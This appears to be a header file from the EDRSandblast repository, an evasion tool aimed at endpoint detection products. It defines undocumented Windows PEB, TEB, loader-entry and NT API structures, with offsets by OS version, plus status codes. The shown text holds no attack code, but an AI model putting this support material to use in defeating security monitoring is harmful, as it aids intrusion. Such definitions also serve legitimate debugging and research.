typedef EXCEPTION_DISPOSITION(CDECL* ExceptionHandler)(EXCEPTION_RECORD* ExceptionRecord, EXCEPTION_REGISTRATION* EstablisherFrame, CONTEXT* ContextRecord, DISPATCHER_CONTEXT_und* DispatcherContext); //same as EXCEPTION_ROUTINE and _except_handler
typedef INT32(STDCALL* TopLevelExceptionFilter)(EXCEPTION_POINTERS* ExceptionInfo); //same as TOP_LEVEL_EXCEPTION_FILTER for SetUnhandledExceptionFilter();
typedef INT32(STDCALL* VectoredExceptionHandler)(EXCEPTION_POINTERS* ExceptionInfo); //same as PVECTORED_EXCEPTION_HANDLER and above signature used with AddVectoredExceptionHandler(), RemoveVectoredExceptionHandler() for XP/WS03 and up

																					 //stack exception frame a.k.a. EXCEPTION_REGISTRATION_RECORD
struct EXCEPTION_REGISTRATION
{
	EXCEPTION_REGISTRATION* prev;
	ExceptionHandler* handler;
};
#define EXCEPTION_CHAIN_END ((EXCEPTION_REGISTRATION*)-1)


//
// PEB-specific structures
//

//forward declarations for unknown structures
typedef struct _ACTIVATION_CONTEXT_DATA { void* dummy; } ACTIVATION_CONTEXT_DATA; //XP and up
typedef struct _ASSEMBLY_STORAGE_MAP { void* dummy; } ASSEMBLY_STORAGE_MAP;       //XP and up
typedef struct _FLS_CALLBACK_INFO { void* dummy; } FLS_CALLBACK_INFO;             //WS03 and up

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	WORD       Flags;
	WORD       Length;
	DWORD      TimeStamp;
	STRING     DosPath;
} RTL_DRIVE_LETTER_CURDIR;

typedef struct _PEB_LDR_DATA
{
	DWORD          Length;                             //0x00
	BYTE           Initialized[4];                     //0x04
	void* SsHandle;                           //0x08
	LIST_ENTRY     InLoadOrderModuleList;              //0x0C
	LIST_ENTRY     InMemoryOrderModuleList;            //0x14
	LIST_ENTRY     InInitializationOrderModuleList;    //0x1C
	void* EntryInProgress;                    //0x24
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct PEB_FREE_BLOCK PEB_FREE_BLOCK;
struct PEB_FREE_BLOCK
{
	PEB_FREE_BLOCK* Next;
	DWORD              Size;
};

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	DWORD                   MaximumLength;                 //0x00
	DWORD                   Length;                        //0x04
	DWORD                   Flags;                         //0x08
	DWORD                   DebugFlags;                    //0x0C
	void* ConsoleHandle;                 //0x10
	DWORD                   ConsoleFlags;                  //0x14
	HANDLE                  StdInputHandle;                //0x18
	HANDLE                  StdOutputHandle;               //0x1C
	HANDLE                  StdErrorHandle;                //0x20
	UNICODE_STRING          CurrentDirectoryPath;          //0x24
	HANDLE                  CurrentDirectoryHandle;        //0x2C
	UNICODE_STRING          DllPath;                       //0x30
	UNICODE_STRING          ImagePathName;                 //0x38
	UNICODE_STRING          CommandLine;                   //0x40
	void* Environment;                   //0x48
	DWORD                   StartingPositionLeft;          //0x4C
	DWORD                   StartingPositionTop;           //0x50
	DWORD                   Width;                         //0x54
	DWORD                   Height;                        //0x58
	DWORD                   CharWidth;                     //0x5C
	DWORD                   CharHeight;                    //0x60
	DWORD                   ConsoleTextAttributes;         //0x64
	DWORD                   WindowFlags;                   //0x68
	DWORD                   ShowWindowFlags;               //0x6C
	UNICODE_STRING          WindowTitle;                   //0x70
	UNICODE_STRING          DesktopName;                   //0x78
	UNICODE_STRING          ShellInfo;                     //0x80
	UNICODE_STRING          RuntimeData;                   //0x88
	RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];      //0x90
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

//
// PEB (Process Environment Block) 32-bit
//
// The size of this structure is OS dependent:
//    0x0098    NT 3.51
//    0x0150    NT 4.0
//    0x01E8    Win2k
//    0x020C    XP
//    0x0230    WS03
//    0x0238    Vista
//    0x0240    Win7_BETA
//    0x0248    Win6
//    0x0250    Win8
//    0x045C    Win10
//
typedef struct _PEB
{
	BOOLEAN                         InheritedAddressSpace;              //0x0000
	BOOLEAN                         ReadImageFileExecOptions;           //0x0001
	BOOLEAN                         BeingDebugged;                      //0x0002
	union
	{
		BOOLEAN                     SpareBool;                          //0x0003 (NT3.51-late WS03)
		struct
		{
			BYTE                    ImageUsesLargePages : 1;   //0x0003:0 (WS03_SP1+)
			BYTE                    IsProtectedProcess : 1;   //0x0003:1 (Vista+)
			BYTE                    IsLegacyProcess : 1;   //0x0003:2 (Vista+)
			BYTE                    IsImageDynamicallyRelocated : 1;   //0x0003:3 (Vista+)
			BYTE                    SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
			BYTE                    IsPackagedProcess : 1;   //0x0003:5 (Win8_BETA+)
			BYTE                    IsAppContainer : 1;   //0x0003:6 (Win8_RTM+)
			BYTE                    SpareBit : 1;   //0x0003:7
		} bits;
	} byte3;
	HANDLE                          Mutant;                             //0x0004
	void* ImageBaseAddress;                   //0x0008
	PEB_LDR_DATA* Ldr;                                //0x000C  (all loaded modules in process)
	RTL_USER_PROCESS_PARAMETERS* ProcessParameters;                  //0x0010
	void* SubSystemData;                      //0x0014
	void* ProcessHeap;                        //0x0018
	RTL_CRITICAL_SECTION* FastPebLock;                        //0x001C
	union
	{
		void* FastPebLockRoutine;                 //0x0020 (NT3.51-Win2k)
		void* SparePtr1;                          //0x0020 (early WS03)
		void* AtlThunkSListPtr;                   //0x0020 (late WS03+)
	} dword20;
	union
	{
		void* FastPebUnlockRoutine;               //0x0024 (NT3.51-XP)
		void* SparePtr2;                          //0x0024 (WS03)
		void* IFEOKey;                            //0x0024 (Vista+)
	} dword24;
	union
	{
		DWORD                       EnvironmentUpdateCount;             //0x0028 (NT3.51-WS03)
		struct
		{
			DWORD                   ProcessInJob : 1;        //0x0028:0 (Vista+)
			DWORD                   ProcessInitializing : 1;        //0x0028:1 (Vista+)
			DWORD                   ProcessUsingVEH : 1;        //0x0028:2 (Vista_SP1+)
			DWORD                   ProcessUsingVCH : 1;        //0x0028:3 (Vista_SP1+)
			DWORD                   ProcessUsingFTH : 1;        //0x0028:4 (Win7_BETA+)
			DWORD                   ReservedBits0 : 27;       //0x0028:5 (Win7_BETA+)
		} vista_CrossProcessFlags;
	} struct28;
	union
	{
		void* KernelCallbackTable;                //0x002C (Vista+)
		void* UserSharedInfoPtr;                  //0x002C (Vista+)
	} dword2C;
	DWORD                           SystemReserved;                     //0x0030 (NT3.51-XP)
																		//Microsoft seems to keep changing their mind with DWORD 0x34
	union
	{
		DWORD                       SystemReserved2;                    //0x0034 (NT3.51-Win2k)
		struct
		{
			DWORD                   ExecuteOptions : 2;        //0x0034:0 (XP-early WS03)
			DWORD                   SpareBits : 30;       //0x0034:2 (XP-early WS03)
		} xpBits;
		DWORD                       AtlThunkSListPtr32;                 //0x0034 (late XP,Win7+)
		DWORD                       SpareUlong;                         //0x0034 (late WS03-Vista)
		struct
		{
			DWORD                   HeapTracingEnabled : 1;        //0x0034:0 (Win7_BETA)
			DWORD                   CritSecTracingEnabled : 1;        //0x0034:1 (Win7_BETA)
			DWORD                   SpareTracingBits : 30;       //0x0034:2 (Win7_BETA)
		} win7_TracingFlags;
	} dword34;
	union
	{
		PEB_FREE_BLOCK* FreeList;                           //0x0038 (NT3.51-early Vista)
		DWORD                       SparePebPtr0;                       //0x0038 (last Vista)
		void* ApiSetMap;                          //0x0038 (Win7+)
	} dword38;
	DWORD                           TlsExpansionCounter;                //0x003C
	void* TlsBitmap;                          //0x0040
	DWORD                           TlsBitmapBits[2];                   //0x0044
	void* ReadOnlySharedMemoryBase;           //0x004C
	union
	{
		void* ReadOnlyShareMemoryHeap;            //0x0050 (NT3.51-WS03)
		void* HotpatchInformation;                //0x0050 (Vista+)
	} dword50;
	void** ReadOnlyStaticServerData;           //0x0054
	void* AnsiCodePageData;                   //0x0058
	void* OemCodePageData;                    //0x005C
	void* UnicodeCaseTableData;               //0x0060
	DWORD                           NumberOfProcessors;                 //0x0064
	DWORD                           NtGlobalFlag;                       //0x0068
	LARGE_INTEGER                   CriticalSectionTimeout;             //0x0070
	DWORD                           HeapSegmentReserve;                 //0x0078
	DWORD                           HeapSegmentCommit;                  //0x007C
	DWORD                           HeapDeCommitTotalFreeThreshold;     //0x0080
	DWORD                           HeapDeCommitFreeBlockThreshold;     //0x0084
	DWORD                           NumberOfHeaps;                      //0x0088
	DWORD                           MaximumNumberOfHeaps;               //0x008C
	void** ProcessHeaps;                       //0x0090
	void* GdiSharedHandleTable;               //0x0094

																		//end of NT 3.51 members / members that follow available on NT 4.0 and up

	void* ProcessStarterHelper;               //0x0098
	DWORD                           GdiDCAttributeList;                 //0x009C
	union
	{
		struct
		{
			void* LoaderLock;                         //0x00A0 (NT4)
		} nt4;
		struct
		{
			RTL_CRITICAL_SECTION* LoaderLock;                         //0x00A0 (Win2k+)
		} win2k;
	} dwordA0;
	DWORD                           OSMajorVersion;                     //0x00A4
	DWORD                           OSMinorVersion;                     //0x00A8
	WORD                            OSBuildNumber;                      //0x00AC
	WORD                            OSCSDVersion;                       //0x00AE
	DWORD                           OSPlatformId;                       //0x00B0
	DWORD                           ImageSubsystem;                     //0x00B4
	DWORD                           ImageSubsystemMajorVersion;         //0x00B8
	DWORD                           ImageSubsystemMinorVersion;         //0x00BC
	union
	{
		KAFFINITY                   ImageProcessAffinityMask;           //0x00C0 (NT4-early Vista)
		KAFFINITY                   ActiveProcessAffinityMask;          //0x00C0 (late Vista+)
	} dwordC0;
	DWORD                           GdiHandleBuffer[0x22];              //0x00C4
	void* PostProcessInitRoutine;             //0x014C / void (*PostProcessInitRoutine) (void);

																		//members that follow available on Windows 2000 and up

	void* TlsExpansionBitmap;                 //0x0150
	DWORD                           TlsExpansionBitmapBits[0x20];       //0x0154
	DWORD                           SessionId;                          //0x01D4
	ULARGE_INTEGER                  AppCompatFlags;                     //0x01D8
	ULARGE_INTEGER                  AppCompatFlagsUser;                 //0x01E0
	void* pShimData;                          //0x01E8
	void* AppCompatInfo;                      //0x01EC
	UNICODE_STRING                  CSDVersion;                         //0x01F0

																		//members that follow available on Windows XP and up

	ACTIVATION_CONTEXT_DATA* ActivationContextData;              //0x01F8
	ASSEMBLY_STORAGE_MAP* ProcessAssemblyStorageMap;          //0x01FC
	ACTIVATION_CONTEXT_DATA* SystemDefaultActivationContextData; //0x0200
	ASSEMBLY_STORAGE_MAP* SystemAssemblyStorageMap;           //0x0204
	DWORD                           MinimumStackCommit;                 //0x0208

																		//members that follow available on Windows Server 2003 and up

	FLS_CALLBACK_INFO* FlsCallback;                        //0x020C
	LIST_ENTRY                      FlsListHead;                        //0x0210
	void* FlsBitmap;                          //0x0218
	DWORD                           FlsBitmapBits[4];                   //0x021C
	DWORD                           FlsHighIndex;                       //0x022C

																		//members that follow available on Windows Vista and up

	void* WerRegistrationData;                //0x0230
	void* WerShipAssertPtr;                   //0x0234

																		//members that follow available on Windows 7 BETA and up

	union
	{
		void* pContextData;                       //0x0238 (prior to Windows 8)
		void* pUnused;                            //0x0238 (Windows 8)
	} dword238;
	void* pImageHeaderHash;                   //0x023C

																		//members that follow available on Windows 7 RTM and up

	struct //TracingFlags
	{
		DWORD                       HeapTracingEnabled : 1;        //0x0240:0
		DWORD                       CritSecTracingEnabled : 1;        //0x0240:1
		DWORD                       LibLoaderTracingEnabled : 1;        //0x0240:2
		DWORD                       SpareTracingBits : 29;       //0x0240:3
	} dword240;
	DWORD                           dummy02;                            //0x0244

																		//members that follow available on Windows 8 and up
	QWORD                           CsrServerReadOnlySharedMemoryBase;  //0x0248

																		//members that follow available on Windows 10 and up
	DWORD                           TppWorkerpListLock;                 //0x0250
	union //conflicting reports about what 0x254 points to
	{
		LIST_ENTRY                  TppWorkerpList;                     //0x0254
		DWORD                       dwSystemCallMode;                   //0x0254 / set to 2 under 64-bit Windows in a 32-bit process (WOW64)
	} dword254;
	void* WaitOnAddressHashTable[128];        //0x025C

} PEB, * PPEB;


//
// TEB-specific structures
//

//GDI_TEB_BATCH - size=0x04E0
typedef struct _GDI_TEB_BATCH
{
	union
	{
		DWORD   Offset;
		struct
		{
			DWORD Offset : 31;  //0x00:00  Win 8.1 Update 1+
			DWORD HasRenderingCommand : 1;   //0x00:31  Win 8.1 Update 1+
		} bits;
	} dword0;
	DWORD   HDC;
	DWORD   Buffer[0x136];
} GDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT
{
	DWORD  Flags;
	CHAR* FrameName;
} TEB_ACTIVE_FRAME_CONTEXT;

typedef struct TEB_ACTIVE_FRAME TEB_ACTIVE_FRAME;
struct TEB_ACTIVE_FRAME
{
	DWORD                      Flags;
	TEB_ACTIVE_FRAME* Previous;
	TEB_ACTIVE_FRAME_CONTEXT* Context;
};

//
// TEB (Thread Environment Block) a.k.a. TIB (Thread Information Block) 32-bit
//
// The size of this structure is OS dependent:
//    0x0F28    NT 3.51
//    0x0F88    NT 4.0
//    0x0FA4    Win2k
//    0x0FB4    prior to XP SP2
//    0x0FB8    XP SP2/WS03+
//    0x0FBC    WS03 SP1+
//    0x0FF8    Vista/WS08
//    0x0FE4    Win7/WS08 R2
//    0x0FE8    Win8-Win8.1/WS12
//    0x1000    Win10
//
typedef struct TEB
{
	//NT_TIB structure portion
	EXCEPTION_REGISTRATION* ExceptionList;                              //0x0000 / Current Structured Exception Handling (SEH) frame
	void* StackBase;                                  //0x0004 / Bottom of stack (high address)
	void* StackLimit;                                 //0x0008 / Ceiling of stack (low address)
	void* SubSystemTib;                               //0x000C
	union
	{
		void* FiberData;                                  //0x0010
		DWORD                   Version;                                    //0x0010
	} dword10;
	void* ArbitraryUserPointer;                       //0x0014
	struct TEB* Self;                                       //0x0018
																			//NT_TIB ends (NT subsystem independent part)

	void* EnvironmentPointer;                         //0x001C
	CLIENT_ID                   ClientId;                                   //0x0020
																			//                          ClientId.ProcessId                          //0x0020 / value retrieved by GetCurrentProcessId()
																			//                          ClientId.ThreadId                           //0x0024 / value retrieved by GetCurrentThreadId()
	void* ActiveRpcHandle;                            //0x0028
	void* ThreadLocalStoragePointer;                  //0x002C
	PEB* ProcessEnvironmentBlock;                    //0x0030
	DWORD                       LastErrorValue;                             //0x0034
	DWORD                       CountOfOwnedCriticalSections;               //0x0038
	void* CsrClientThread;                            //0x003C
	void* Win32ThreadInfo;                            //0x0040
	DWORD                       User32Reserved[0x1A];                       //0x0044
	DWORD                       UserReserved[5];                            //0x00AC
	void* WOW32Reserved;                              //0x00C0 / user-mode 32-bit (WOW64) -> 64-bit context switch function prior to kernel-mode transition
	LCID                        CurrentLocale;                              //0x00C4
	DWORD                       FpSoftwareStatusRegister;                   //0x00C8
	union
	{
		DWORD                   SystemReserved1[0x36];                      //0x00CC (NT 3.51-Win8)
		struct
		{
			DWORD               Reserved1[0x16];                            //0x00CC
			void* pKThread;                                   //0x0124 / pointer to KTHREAD (ETHREAD) structure
			DWORD               Reserved2[0x1F];                            //0x0128
		} kernelInfo;
		struct
		{
			DWORD               ReservedForDebuggerInstrumentation[0x10];   //0x00CC (Win10 PRE-RTM+)
			DWORD               SystemReserved1[0x26];                      //0x010C (Win10 PRE-RTM+)
		} win10;
	} dwordCC;
	NTSTATUS                    ExceptionCode;                              //0x01A4
	union
	{
		BYTE                    SpareBytes1[0x2C];                          //0x01A8 (NT3.51-Win2k)
		struct
		{
			BYTE                ActivationContextStack[0x14];               //0x01A8 (XP-early WS03)
			BYTE                SpareBytes1[0x18];                          //0x01BC (XP-early WS03)
		} xp;
		struct
		{
			void* ActivationContextStackPointer;              //0x01A8 (WS03+)
			union
			{
				BYTE            SpareBytes1[0x24];                          //0x01AC (WS03-Win8.1)
				struct
				{
					void* InstrumentationCallbackSp;                  //0x01AC (Win10+)
					void* InstrumentationCallbackPreviousPc;          //0x01B0 (Win10+)
					void* InstrumentationCallbackPreviousSp;          //0x01B4 (Win10+)
					BOOLEAN     InstrumentationCallbackDisabled;            //0x01B8 (Win10+)
					BYTE        SpareBytes[0x17];                           //0x01B9 (Win10+)
				} win10;
			} dword1AC;
			union
			{
				BYTE            SpareBytes2[4];                             //0x01D0 (WS03)
				DWORD           TxFsContext;                                //0x01D0 (Vista+)
			} dword1D0;
		} lateWs03;
	} dword1A8;
	GDI_TEB_BATCH               GdiTebBatch;                                //0x01D4
	CLIENT_ID                   RealClientId;                               //0x06B4
	HANDLE                      GdiCachedProcessHandle;                     //0x06BC
	DWORD                       GdiClientPID;                               //0x06C0
	DWORD                       GdiClientTID;                               //0x06C4
	void* GdiThreadLocalInfo;                         //0x06C8
	DWORD                       Win32ClientInfo[0x3E];                      //0x06CC
	void* glDispatchTable[0xE9];                      //0x07C4
	DWORD                       glReserved1[0x1D];                          //0x0B68
	void* glReserved2;                                //0x0BDC
	void* glSectionInfo;                              //0x0BE0
	void* glSection;                                  //0x0BE4
	void* glTable;                                    //0x0BE8
	void* glCurrentRC;                                //0x0BEC
	void* glContext;                                  //0x0BF0
	NTSTATUS                    LastStatusValue;                            //0x0BF4
	UNICODE_STRING              StaticUnicodeString;                        //0x0BF8
	WCHAR                       StaticUnicodeBuffer[0x105];                 //0x0C00
	void* DeallocationStack;                          //0x0E0C
	void* TlsSlots[0x40];                             //0x0E10
	LIST_ENTRY                  TlsLinks;                                   //0x0F10
	void* Vdm;                                        //0x0F18
	void* ReservedForNtRpc;                           //0x0F1C
	void* DbgSsReserved[2];                           //0x0F20

																			//end of NT 3.51 members / members that follow available on NT 4.0 and up

	union
	{
		DWORD                   ThreadErrorMode;                            //0x0F28 (OS?) / RtlSetThreadErrorMode
		DWORD                   HardErrorsAreDisabled;                      //0x0F28 (NT4-XP)
		DWORD                   HardErrorMode;                              //0x0F28 (WS03+)
	} dwordF28;
	union
	{
		struct
		{
			DWORD               Instrumentation[0x10];                      //0x0F2C (NT4-early WS03)
		} nt;
		struct
		{
			union
			{
				struct
				{
					DWORD       Instrumentation[0x0E];                      //0x0F2C (late WS03+)
					void* SubProcessTag;                              //0x0F64 (late WS03+)
				} beforeVista;
				struct
				{
					DWORD       Instrumentation[9];                         //0x0F2C (Vista+)
					GUID        ActivityId;                                 //0x0F50 (Vista+)
					void* SubProcessTag;                              //0x0F60 (Vista+)
					union
					{
						DWORD   EtwLocalData;                               //0x0F64 (WIN8 PRE-RTM)
						DWORD   PerflibData;                                //0x0F64 (WIN8 RTM+)
					} win8;

				} vista;
			} dwordF2C;
			void* EtwTraceData;                               //0x0F68 (late WS03+)
		} ws03;
	} dwordF2C;
	void* WinSockData;                                //0x0F6C
	DWORD                       GdiBatchCount;                              //0x0F70
	union
	{
		struct
		{
			union
			{
				struct
				{
					BOOLEAN     InDbgPrint;                                 //0x0F74 (NT4-WS03)
					BOOLEAN     FreeStackOnTermination;                     //0x0F75 (NT4-WS03)
					BOOLEAN     HasFiberData;                               //0x0F76 (NT4-WS03)
				} beforeVista;
				union
				{
					BOOLEAN     SpareBool0;                                 //0x0F74 (Vista)
					BOOLEAN     SpareBool1;                                 //0x0F75 (Vista)
					BOOLEAN     SpareBool2;                                 //0x0F76 (Vista)
				} vista;
			} u;
			BOOLEAN             IdealProcessor;                             //0x0F77 (NT4-Vista)
		} beforeWin7;
		PROCESSOR_NUMBER        CurrentIdealProcessor;                      //0x0F74 (Win7+)
	} dwordF74;
	union
	{
		DWORD                   Spare3;                                     //0x0F78 (NT4-early WS03)
		DWORD                   GuaranteedStackBytes;                       //0x0F78 (late WS03+)
	} dwordF78;
	void* ReservedForPerf;                            //0x0F7C
	void* ReservedForOle;                             //0x0F80
	DWORD                       WaitingOnLoaderLock;                        //0x0F84

																			//members that follow available on Windows 2000 and up

	union
	{
		struct
		{
			//Wx86ThreadState structure
			DWORD* CallBx86Eip;                                //0x0F88 (Win2k-early WS03)
			void* DeallocationCpu;                            //0x0F8C (Win2k-early WS03)
			BYTE                UseKnownWx86Dll;                            //0x0F90 (Win2k-early WS03)
			CHAR                OleStubInvoked;                             //0x0F91 (Win2k-early WS03)
			BYTE                Padding[2];                                 //0x0F92
		} beforeLateWs03;
		struct
		{
			union
			{
				void* SparePointer1;                              //0x0F88 (late WS03)
				void* SavedPriorityState;                         //0x0F88 (Vista+)
			} dwordF88;
			union
			{
				void* SoftPatchPtr1;                              //0x0F8C (late WS03-Win7)
				void* ReservedForCodeCoverage;                    //0x0F8C (Win8+)
			} dwordF8C;
			union
			{
				void* SoftPatchPtr2;                              //0x0F90 (late WS03)
				void* ThreadPoolData;                             //0x0F90 (Vista+)
			} dwordF90;
		} lateWs03;
	} dwordF88;
	void* TlsExpansionSlots;                          //0x0F94
	union
	{
		LCID                    ImpersonationLocale;                        //0x0F98 (Win2k-Vista)
		DWORD                   MuiGeneration;                              //0x0F98 (Win7+)
	} dwordF98;
	DWORD                       IsImpersonating;                            //0x0F9C
	void* NlsCache;                                   //0x0FA0

																			//members that follow available on Windows XP and up

	void* pShimData;                                  //0x0FA4
	union
	{
		DWORD                   HeapVirtualAffinity;                        //0x0FA8 (XP-Win7)
		struct
		{
			WORD                HeapVirtualAffinity;                        //0x0FA8 (Win8+)
			WORD                LowFragHeapDataSlot;                        //0x0FAA (Win8+)
		} win8;
	} dwordFA8;
	HANDLE                      CurrentTransactionHandle;                   //0x0FAC
	TEB_ACTIVE_FRAME* ActiveFrame;                                //0x0FB0

																			//members that follow available on Windows XP SP2 and up

	union
	{
		void* FlsData;                                    //0x0FB4 (WS03+)
		struct
		{
			BOOLEAN             SafeThunkCall;                              //0x0FB4 (XP SP2)
			BOOLEAN             BooleanSpare[3];                            //0x0FB5 (XP SP2)
		} xpSp2;
	} dwordFB4;
	union
	{
		struct
		{
			BOOLEAN             SafeThunkCall;                              //0x0FB8 (late WS03)
			BOOLEAN             BooleanSpare[3];                            //0x0FB9 (late WS03)
		} ws03;
		void* PreferredLanguages;                         //0x0FB8 (Vista+)
	} dwordFB8;

	//members that follow available on Windows Vista and up

	void* UserPrefLanguages;                          //0x0FBC
	void* MergedPrefLanguages;                        //0x0FC0
	DWORD                       MuiImpersonation;                           //0x0FC4
	union
	{
		volatile WORD           CrossTebFlags;                              //0x0FC8
		struct
		{
			WORD                SpareCrossTebBits : 16;                     //0x0FC8
		} bits;
	} wordFC8;
	union
	{
		WORD                    SameTebFlags;                               //0x0FCA
		struct
		{
			WORD                SafeThunkCall : 1;                   //0x0FCA:0x00
			WORD                InDebugPrint : 1;                   //0x0FCA:0x01
			WORD                HasFiberData : 1;                   //0x0FCA:0x02
			WORD                SkipThreadAttach : 1;                   //0x0FCA:0x03
			WORD                WerInShipAssertCode : 1;                   //0x0FCA:0x04
			WORD                RanProcessInit : 1;                   //0x0FCA:0x05
			WORD                ClonedThread : 1;                   //0x0FCA:0x06
			WORD                SuppressDebugMsg : 1;                   //0x0FCA:0x07
			WORD                DisableUserStackWalk : 1;                   //0x0FCA:0x08
			WORD                RtlExceptionAttached : 1;                   //0x0FCA:0x09
			WORD                InitialThread : 1;                   //0x0FCA:0x0A
			WORD                SessionAware : 1;                   //0x0FCA:0x0B
		} bits;
	} wordFCA;
	void* TxnScopeEnterCallback;                      //0x0FCC
	void* TxnScopeExitCallback;                       //0x0FD0
	void* TxnScopeContext;                            //0x0FD4
	DWORD                       LockCount;                                  //0x0FD8
	union
	{
		struct
		{
			DWORD               ProcessRundown;                             //0x0FDC (Vista)
			QWORD               LastSwitchTime;                             //0x0FE0 (Vista)
			QWORD               TotalSwitchOutTime;                         //0x0FE8 (Vista)
			LARGE_INTEGER       WaitReasonBitMap;                           //0x0FF0 (Vista)
		} vista;

		//end of Vista members

		struct
		{
			union
			{
				DWORD           SpareUlong0;                                //0x0FDC (Win7-Win8)
				INT32           WowTebOffset;                               //0x0FDC (Win10+)
			} dwordFDC;
			void* ResourceRetValue;                           //0x0FE0 (Win7+)

																			//end of Windows 7 members (TEB shrunk after Vista)

			void* ReservedForWdf;                             //0x0FE4 (Win8+)

																			//end of Windows 8 members

		} afterVista;
	} dwordFDC;

	//members that follow available on Windows 10 and up (currently unknown)

	BYTE                        ReservedForWin10[0x18];                     //0x0FE8

} TEB;


typedef struct {
	ULONG i[2];
	ULONG buf[4];
	unsigned char in[64];
	unsigned char digest[16];
} MD5_CTX;

typedef VOID(WINAPI* PMD5Init) (MD5_CTX* context);
typedef VOID(WINAPI* PMD5Update)(MD5_CTX* context, const unsigned char* input, unsigned int inlen);
typedef VOID(WINAPI* PMD5Final) (MD5_CTX* context);

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		} SectionPointerAndCheckSum;
	} HashLinksOrSectionPointerAndCheckSum;
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	} TimeDateStampOrLoadedImports;
	//_ACTIVATION_CONTEXT* EntryPointActivationContext;
	PVOID EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

#define OBJ_CASE_INSENSITIVE             0x00000040L
#define FILE_SUPERSEDE			         0x00000000
#define FILE_OPEN                        0x00000001
#define FILE_CREATE                      0x00000002
#define FILE_OPEN_IF                     0x00000003
#define FILE_OVERWRITE                   0x00000004
#define FILE_MAXIMUM_DISPOSITION         0x00000005
#define FILE_DIRECTORY_FILE              0x00000001
#define FILE_WRITE_THROUGH               0x00000002
#define FILE_SEQUENTIAL_ONLY             0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING   0x00000008
#define FILE_SYNCHRONOUS_IO_ALERT        0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT     0x00000020
#define FILE_NON_DIRECTORY_FILE          0x00000040
#define FILE_CREATE_TREE_CONNECTION      0x00000080
#define FILE_COMPLETE_IF_OPLOCKED        0x00000100
#define FILE_NO_EA_KNOWLEDGE             0x00000200
#define FILE_OPEN_FOR_RECOVERY           0x00000400
#define FILE_RANDOM_ACCESS               0x00000800
#define FILE_DELETE_ON_CLOSE             0x00001000
#define FILE_OPEN_BY_FILE_ID             0x00002000
#define FILE_OVERWRITE_IF                0x00000005

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		VOID* Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef enum _PROCESSINFOCLASS
{
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29
} PROCESSINFOCLASS, * PPROCESSINFOCLASS;

typedef VOID(NTAPI* PIO_APC_ROUTINE) (
	IN PVOID            ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG            Reserved);

typedef LONG KPRIORITY;
typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
typedef enum _MEMORY_INFORMATION_CLASS {
	MemoryBasicInformation,
	MemoryWorkingSetInformation,
	MemoryMappedFilenameInformation,
	MemoryRegionInformation,
	MemoryWorkingSetExInformation,
	MemorySharedCommitInformation,
	MemoryImageInformation,
	MemoryRegionInformationEx,
	MemoryPrivilegedBasicInformation,
	MemoryEnclaveImageInformation,
	MemoryBasicInformationCapped
} MEMORY_INFORMATION_CLASS, * PMEMORY_INFORMATION_CLASS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define STATUS_SUCCES 0x00000000
#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_PARTIAL_COPY 0x8000000D
#define STATUS_ACCESS_DENIED 0xC0000022
#define STATUS_OBJECT_PATH_NOT_FOUND 0xC000003A
#define STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034
#define STATUS_OBJECT_NAME_INVALID 0xc0000033
#define STATUS_SHARING_VIOLATION 0xC0000043
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define STATUS_INVALID_CID 0xC000000B
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_OBJECT_PATH_SYNTAX_BAD 0xC000003B
#define STATUS_BUFFER_TOO_SMALL 0xC0000023
#define STATUS_OBJECT_NAME_COLLISION 0xC0000035
#define STATUS_ALERTED 0x00000101

#include "undoc_64.h"

```

`EDRSandblast/Includes/Undoc_64.h`:

```h
#pragma once
#include "Undoc.h"

//
// [TEB/PEB UNDER 64-BIT WINDOWS]
// This file represents the 64-bit PEB and associated data structures for 64-bit Windows
// This PEB is allegedly valid between XP thru [at least] Windows 8
//
// [REFERENCES]
//      http://terminus.rewolf.pl/terminus/structures/ntdll/_PEB_x64.html
//      http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB64_x86.html
//      https://github.com/giampaolo/psutil/commit/babd2b73538fcb6f3931f0ab6d9c100df6f37bcb     (RTL_USER_PROCESS_PARAMETERS)
